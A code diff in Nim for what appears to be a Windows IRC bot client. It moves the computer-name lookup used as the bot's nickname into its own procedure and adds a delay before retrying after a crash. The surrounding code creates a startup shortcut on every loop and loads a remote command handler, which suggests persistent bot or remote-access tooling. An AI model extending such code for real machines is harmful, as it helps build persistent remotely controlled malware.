@@ -3,6 +3,28 @@ import irc, asyncdispatch, winim, random, strutils, threadpool
 import command_handler, update_handler
 
 
+
+proc generateName():string = 
+  var
+    name_buffer: array[0..15, WCHAR]
+    name_size : DWORD
+    name : string
+  name_size = 15*sizeof(WCHAR)
+
+  ## Nickname is based on computer name
+  if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
+      raise newException(OSError, "Failed to retrieve computer name")
+
+  ## The computer name needs to become a proper string as opposed to a raw buffer
+  for i in 0..<len(name_buffer):
+      if name_buffer[i] != 0:
+          name &= cast[char](name_buffer[i])
+      else:
+          break
+  return name
+
+
+
 while true:
   # Check for updates
   waitFor updt_clearTemp()
@@ -22,22 +44,7 @@ while true:
 
   updt_createStartupShortcut()
 
-  var
-      name_buffer: array[0..15, WCHAR]
-      name_size : DWORD
-      name : string
-  name_size = 15*sizeof(WCHAR)
-
-  ## Nickname is based on computer name
-  if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
-      raise newException(OSError, "Failed to retrieve computer name")
-
-  ## The computer name needs to become a proper string as opposed to a raw buffer
-  for i in 0..<len(name_buffer):
-      if name_buffer[i] != 0:
-          name &= cast[char](name_buffer[i])
-      else:
-          break
+  var name = generateName()
 
   if g_dbg: echo "ComputerName: ", name
 
@@ -85,3 +92,5 @@ while true:
     runForever()
   except:
     echo "EVERYTHING IS FUCKED UP. RETRYING"
+    Sleep(15000)
+    g_first_run = true
